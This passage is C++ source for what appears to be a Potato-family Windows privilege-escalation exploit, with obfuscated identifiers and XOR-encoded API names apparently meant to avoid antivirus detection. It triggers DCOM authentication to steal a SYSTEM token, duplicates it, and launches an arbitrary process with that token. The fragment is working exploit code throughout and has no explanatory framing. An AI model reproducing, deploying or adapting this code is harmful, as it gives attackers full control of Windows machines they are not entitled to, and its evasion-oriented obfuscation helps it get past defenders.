	char  hid_OpenPr_TCXrbkREHqW8[] = {'\xa','\x35','\x20','\x2b','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
char k_1gm4UjsY622V = '\x45';
for(int i = 0; i < sizeof(hid_OpenPr_TCXrbkREHqW8) / sizeof(hid_OpenPr_TCXrbkREHqW8[0]); i++){
hid_OpenPr_TCXrbkREHqW8[i] = hid_OpenPr_TCXrbkREHqW8[i] ^ k_1gm4UjsY622V;
}

	_OpenProcessToken hid_OpenPr_BRMxa9paccOd = (_OpenProcessToken) GetProcAddress(hid_hHandl_DZwJ0DawW3Ue, hid_OpenPr_TCXrbkREHqW8);
PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf(hid_Testin_PjJYWvnkegDY, olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf(hid______a_mdCqpHd3LoH3, test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!hid_OpenPr_BRMxa9paccOd(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, hid_S_e_I__9THD15i1ljt5);
			EnablePriv(hToken, hid_S_e_A__IvFPmxGRhIuc);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			hid_OpenPr_G6tw1zF1pWUq(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			hid_QueryS_1hmeysvxRSc5(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			hid_GetTok_Bp84CN6p7CzA(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_____Er_HrI3Aob9dhzB, GetLastError());

			result = hid_Duplic_5d8AJVxZKiZW(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			hid_GetTok_BoW81jjJ6wpD(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_Error__6JJ7ozbUrtrG, GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = hid_Create_3lUoT0tH9oca(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf(hid______C_Ayl2MsGVY4GS, GetLastError());
				}
				else
				{
					printf(hid______C_75ifnTFR5UWh);
					break;
				}
			} 

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = hid_Create_wJpOZcQtl77v(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					hid_C______rGsA66c2sfCJ, &si, &pi
				);

				if (!result) {
					printf(hid______C_jTZP2bBP3O7q, GetLastError());
				}
				else {
					printf(hid______C_SB0umAUOvbiQ);
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf(hid_Waitin_jNCAIjyFm9iG);
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
